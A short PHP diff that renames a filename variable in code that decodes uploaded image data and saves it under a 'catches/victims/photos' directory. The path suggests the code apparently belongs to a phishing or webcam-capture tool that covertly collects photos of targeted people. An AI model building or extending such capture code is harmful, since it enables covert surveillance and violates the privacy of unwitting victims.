@@ -15,9 +15,9 @@
 
     error_log("Decoded image size: " . strlen($imageData) . " bytes");
 
-    $filename = 'photo_' . time() . '.png';
+    $fileName = 'photo_' . time() . '.png';
     $photosDir = "./catches/victims" . '/' . 'photos';
-    $filePath = $photosDir . '/' . $filename;
+    $filePath = $photosDir . '/' . $fileName;
 
     if (!file_exists($photosDir)) {
       mkdir($photosDir, 0755, true);
@@ -27,7 +27,7 @@
     error_log("File write result: " . ($result !== false ? "Success ($result bytes)" : "Failed"));
 
     if ($result !== false) {
-      error_log("Saved as $filename (size: " . strlen($imageData) . " bytes)");
+      error_log("Saved as $fileName (size: " . strlen($imageData) . " bytes)");
     } else {
       http_response_code(500);
       error_log("Failed to save image");
